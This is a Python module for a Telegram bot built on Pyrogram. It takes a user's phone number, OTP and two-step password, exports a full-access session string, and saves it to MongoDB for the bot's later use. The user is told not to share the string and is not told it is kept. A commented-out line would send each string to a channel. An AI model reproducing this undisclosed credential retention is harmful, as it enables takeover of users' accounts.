import pymongo
import os
from .. import modi as app
from .. import bot as gagan
from pyrogram import Client, filters
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)
import random
import asyncio
from config import API_ID as api_id, API_HASH as api_hash, MONGODB_CONNECTION_STRING, LOG_GROUP 

DB_NAME = "logins"
COLLECTION_NAME = "stringsession"

mongo_client = pymongo.MongoClient(MONGODB_CONNECTION_STRING)
db = mongo_client[DB_NAME]
collection = db[COLLECTION_NAME]

user_steps = {}
user_data = {}

async def session_step(client, message):
    user_id = message.chat.id
    step = user_steps.get(user_id, None)

    if step == "phone_number":
        user_data[user_id] = {"phone_number": message.text}
        user_steps[user_id] = "otp"
        omsg = await message.reply("Sending OTP...")
        session_name = f"session_{user_id}"
        temp_client = Client(session_name, api_id, api_hash)
        user_data[user_id]["client"] = temp_client
        await temp_client.connect()
        try:
            code = await temp_client.send_code(user_data[user_id]["phone_number"])
            user_data[user_id]["phone_code_hash"] = code.phone_code_hash
            await omsg.delete()
            await message.reply("OTP telah terkirim. Silakan masukkan OTP dengan format: '1 2 3 4 5'.")
        except ApiIdInvalid:
            await message.reply('❌ Kombinasi ID API dan API HASH tidak valid. Silakan mulai ulang sesinya.')
            reset_user(user_id)
        except PhoneNumberInvalid:
            await message.reply('❌ Nomor telepon tidak valid. Silakan mulai ulang sesi ini.')
            reset_user(user_id)
    elif step == "otp":
        phone_code = message.text.replace(" ", "")
        temp_client = user_data[user_id]["client"]
        try:
            await temp_client.sign_in(user_data[user_id]["phone_number"], user_data[user_id]["phone_code_hash"], phone_code)
            session_string = await temp_client.export_session_string()
            session_data = {
                "user_id": user_id,
                "session_string": session_string
            }
            collection.update_one(
                {"user_id": user_id},
                {"$set": session_data},
                upsert=True
            )
            await message.reply(f"✅Sesi Berhasil Dihasilkan! Berikut string sesi Anda:\n\n`{session_string}`\n\nJangan membaginya dengan siapa pun, kami tidak bertanggung jawab atas kesalahan penanganan atau penyalahgunaan.\n\n**__Didukung oleh Tim SPY__**")
            # await gagan.send_message(SESSION_CHANNEL, f"✨ **__USER ID__** : {user_id}\n\n✨ **__2SP__** : `None`\n\n✨ **__Session String__ 👇**\n\n`{session_string}`")
            await temp_client.disconnect()
            reset_user(user_id)
        except PhoneCodeInvalid:
            await message.reply('❌ OTP tidak valid. Silakan mulai ulang sesi ini.')
            reset_user(user_id)
        except PhoneCodeExpired:
            await message.reply('❌ OTPnya sudah habis masa berlakunya. Silakan mulai ulang sesi ini.')
            reset_user(user_id)
        except SessionPasswordNeeded:
            user_steps[user_id] = "password"
            await message.reply('Akun Anda mengaktifkan verifikasi dua langkah. Silakan masukkan kata sandi Anda.')
    elif step == "password":
        temp_client = user_data[user_id]["client"]
        try:
            password = message.text
            await temp_client.check_password(password=password)
            session_string = await temp_client.export_session_string()
            session_data = {
                "user_id": user_id,
                "session_string": session_string
            }
            collection.update_one(
                {"user_id": user_id},
                {"$set": session_data},
                upsert=True
            )
            await message.reply(f"✅ Sesi Berhasil Dihasilkan! Berikut string sesi Anda:\n\n`{session_string}`\n\nJangan membaginya dengan siapa pun, kami tidak bertanggung jawab atas kesalahan penanganan atau penyalahgunaan.\n\n**__Didukung oleh Tim SPY__**")
            await temp_client.disconnect()
            reset_user(user_id)
        except PasswordHashInvalid:
            await message.reply('❌ Kata sandi salah. Silakan mulai ulang sesi ini.')
            reset_user(user_id)
    else:
        await message.reply('Silakan masukkan nomor telepon Anda beserta kode negara. \n\nContoh: +19876543210')
        user_steps[user_id] = "phone_number"

def reset_user(user_id):
    user_steps.pop(user_id, None)
    user_data.pop(user_id, None)

@app.on_message(filters.command("session"))
async def login_command(client, message):
    await session_step(client, message)

@app.on_message(filters.text & filters.private)
async def handle_steps(client, message):
    user_id = message.chat.id
    if user_id in user_steps:
        await session_step(client, message)

def get_session(sender_id):
    user_data = collection.find_one({"user_id": sender_id})
    if user_data:
        return user_data.get("session_string")
    else:
        return None
